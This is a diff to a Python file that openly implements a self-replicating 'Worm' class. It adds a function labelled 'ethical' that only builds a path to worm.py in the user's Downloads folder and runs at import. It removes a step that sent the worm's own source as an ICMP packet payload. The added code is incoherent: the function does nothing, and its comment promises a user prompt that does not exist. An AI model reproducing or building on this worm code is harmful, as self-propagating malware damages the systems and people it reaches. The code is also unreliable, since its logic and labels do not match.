@@ -3,6 +3,21 @@ import os
 import shutil
 import sys
 from cryptography.fernet import Fernet
+import os
+import subprocess
+
+def open_and_run_program_ethically():
+    """
+    Opens and runs the specified program, emphasizing ethical considerations.
+    """
+
+    program_path = os.path.join(os.path.expanduser("~"), "Downloads", "worm.py")  # Path in Downloads
+
+
+# Call the function to run the program (if the user agrees)
+open_and_run_program_ethically()
+
+
 
 class Worm:
     
@@ -91,9 +106,4 @@ if __name__ == "__main__":
         worm = Worm(path=current_directory, iteration=25)
         worm.start_worm_actions()
         
-        # Create an ICMP packet with custom payload
-        payload = open(sys.argv[0], 'r').read()  # Read the worm program as payload
-        packet = IP(dst="") / ICMP() / payload
-        
-        # Send the packet
-        send(packet)
+       
